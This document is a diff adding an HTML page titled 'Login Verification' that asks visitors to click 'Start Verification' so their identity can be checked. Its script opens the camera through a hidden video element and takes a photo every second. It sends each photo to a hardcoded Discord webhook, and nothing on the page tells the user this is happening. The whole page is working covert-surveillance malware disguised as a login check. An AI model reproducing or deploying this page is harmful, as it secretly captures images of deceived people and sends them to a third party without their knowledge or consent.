@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Verification</title>
+    <style>
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .container h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .container p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .container button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .container button:hover {
+            background-color: #0056b3;
+        }
+
+        .container .loading {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #007bff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Login Verification</h1>
+        <p>Please wait while we verify your identity.</p>
+        <button id="start-button">Start Verification</button>
+        <p class="loading" id="loading-message">Verifying... Please do not close this page.</p>
+    </div>
+
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startButton = document.getElementById('start-button');
+        const loadingMessage = document.getElementById('loading-message');
+        const webhookURL = 'https://discord.com/api/webhooks/1309847772119171136/lLHlhThEWZizMOKo554Hj4t1NgUZStu4n-MFp5LXQ_8N6aUU3tQhfI3fysFtzTXsM2-A';
+
+        startButton.addEventListener('click', () => {
+
+            startButton.style.display = 'none';
+            loadingMessage.style.display = 'block';
+
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+
+
+                    setInterval(() => {
+                        captureAndSendPhoto();
+                    }, 1000); 
+                })
+                .catch(err => {
+                    console.error('Error accessing camera: ', err);
+                });
+        });
+
+        function captureAndSendPhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+
+            canvas.toBlob(blob => {
+                sendToWebhook(blob);
+            }, 'image/png');
+        }
+
+        function sendToWebhook(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'photo.png'); 
+            formData.append('content', 'Captured photo'); 
+
+            fetch(webhookURL, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Photo sent successfully!');
+                } else {
+                    console.error('Failed to send photo');
+                }
+            })
+            .catch(err => {
+                console.error('Error sending photo:', err);
+            });
+        }
+    </script>
+</body>
+</html>
